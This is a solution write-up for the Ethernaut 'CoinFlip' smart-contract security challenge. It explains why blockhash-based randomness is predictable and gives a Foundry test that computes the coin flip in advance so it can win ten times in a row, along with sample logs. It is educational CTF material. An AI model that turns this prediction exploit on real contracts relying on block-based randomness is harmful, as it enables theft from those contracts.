# What is OpenZeppelin Ethernaut?

OpenZeppelin Ethernaut is an educational platform that provides interactive and gamified challenges to help users learn about Ethereum smart contract security. It is developed by OpenZeppelin, a company known for its security audits, tools, and best practices in the blockchain and Ethereum ecosystem.

OpenZeppelin Ethernaut Website: [ethernaut.openzeppelin.com](ethernaut.openzeppelin.com)

# What You're Supposed to Do?

in `03-CoinFlip` Challenge, You Should Try To find a Way to Guess Correctly What Will be The Output of Coin Flip and You have to do it `10` times in a Row.

`03-CoinFlip` Challenge Link: [https://ethernaut.openzeppelin.com/level/0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF](https://ethernaut.openzeppelin.com/level/0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF)

# How did i Complete This Challenge?

So First We Should Understand How the Coin Flip Works:

```javascript
    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
```

We Get Random Number With Decremented Current `block.number` Value by 1 and then hash it with `blockhash`, then convert returned `bytes32` to `uint256` and Store it to `blockValue` variable.

then We Set `lastHash` variable value to `blockValue`.

Then We Divide `blockValue` to `57896044618658097711785492504343953926634992332820282019728792003956564819968` and then Store it to a variable named as `coinFlip`.

Then We Check if Value of `coinFlip` is Equal to `1` or not, Returned Value is an Boolean Value Which is Stored in a variable named `side`.

Then We Check if `side` Boolean Value is Equal to the `_guess` Boolean Value Which We Passed as Parameter to `flip` function. if is `true`, then We Increment the `consecutiveWins` by `1` and then return `true` , otherwise we set the `consecutiveWins` to 0 (even if consecutiveWins current value is 9) and return `false`.

also if You Guessed Coin Flip Once Correctly, You Cannot Call `flip` function right after it because We have a if Statement that Checks `if (lastHash == blockValue) {revert();}`.

As We Know the block attributes are Bad source of Randomness, Because the Value of it is Public to Everyone on Blockchain and Can Be guessed, so Basically it's Not a Random Number When it's Guessable.

This is The Test i Wrote Which Allows You To Guess the Output of the CoinFlip 10 times in a Row Correctly Without Losing One time (basically setting `consecutiveWins` back to 0).

It's Just an While Loop That does the Same thing as the `flip` function but tries it with different `block.number`s and Checks if the CoinFlip Guess Was Right before calling the actual `flip` function.

```javascript
    function testRandomNumberIsPredictable() external {
        vm.startPrank(attacker);
        while (consecutiveWins < 10) {
            console2.log("Current Consecutive Wins: ", consecutiveWins);
            uint256 blockValue = uint256(blockhash(block.number - 1));

            if (lastHash == blockValue) {
                revert();
            }

            lastHash = blockValue;
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;

            if (side == _guess) {
                bool isTrue = coinFlipContract.flip(_guess);
                if (isTrue) {
                    consecutiveWins++;
                    vm.roll(block.number + increment);
                    increment++;
                }
            } else if (side != _guess) {
                _guess = !_guess;
                vm.roll(block.number + increment);
                increment++;
            }
        }
        vm.stopPrank();
        console2.log("You WON! Current Consecutive Wins: ", consecutiveWins);
    }
```


You Can Run this Test in Your Terminal: (it's Required to Have [Foundry](https://book.getfoundry.sh/) Installed)

```javascript
    forge test --match-test testRandomNumberIsPredictable -vvvv
```

Take A look At the `Logs`, To See How Many Tries it Took the Get `10` consecutiveWins.

```javascript

    // My Current Run Logs, Looks Like This:

    Logs:
        Current Consecutive Wins:  0
        Current Consecutive Wins:  1
        Current Consecutive Wins:  1
        Current Consecutive Wins:  1
        Current Consecutive Wins:  1
        Current Consecutive Wins:  1
        Current Consecutive Wins:  2
        Current Consecutive Wins:  2
        Current Consecutive Wins:  3
        Current Consecutive Wins:  3
        Current Consecutive Wins:  3
        Current Consecutive Wins:  3
        Current Consecutive Wins:  4
        Current Consecutive Wins:  5
        Current Consecutive Wins:  6
        Current Consecutive Wins:  7
        Current Consecutive Wins:  8
        Current Consecutive Wins:  9
        You WON! Current Consecutive Wins:  10

```

it Took `19` Loops, To Win. What This While Loop Did it sets new `block.number` by Incrementing the Current `block.number` with `increment` variable value, everytime the guess for the Coin, Turns out to be Wrong. meaning `if (side != _guess)`.